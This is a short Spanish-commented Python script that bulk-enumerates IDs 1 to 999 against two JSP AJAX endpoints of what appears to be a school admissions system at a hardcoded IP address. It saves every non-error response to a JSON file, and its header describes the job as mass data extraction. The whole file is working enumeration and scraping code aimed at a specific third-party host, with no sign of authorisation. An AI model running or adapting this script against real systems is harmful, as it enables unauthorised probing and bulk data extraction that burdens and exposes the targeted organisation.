#!/usr/bin/env python3
# Extracción masiva de datos del endpoint funcional

import requests
import json

def extract_all_bachilleratos():
    target = "189.254.143.102"
    session = requests.Session()
    
    print("[+] EXTRAYENDO TODOS LOS BACHILLERATOS...")
    
    # Probar un rango amplio de IDs
    bachilleratos = {}
    
    for i in range(1, 1000):  # Probar hasta 1000
        url1 = f"http://{target}/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato={i}"
        url2 = f"http://{target}/jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato={i}"
        
        for url in [url1, url2]:
            try:
                r = session.get(url, timeout=3)
                if r.status_code == 200 and len(r.text.strip()) > 5:
                    # Limpiar y formatear respuesta
                    content = r.text.strip()
                    if content and content != "null" and "error" not in content.lower():
                        bachilleratos[i] = content
                        print(f"✅ ID {i}: {content}")
                        break
            except:
                continue
    
    # Guardar resultados
    with open("bachilleratos_completos.json", "w", encoding='utf-8') as f:
        json.dump(bachilleratos, f, indent=2, ensure_ascii=False)
    
    print(f"\n🎯 Total de bachilleratos encontrados: {len(bachilleratos)}")
    return bachilleratos

if __name__ == "__main__":
    extract_all_bachilleratos()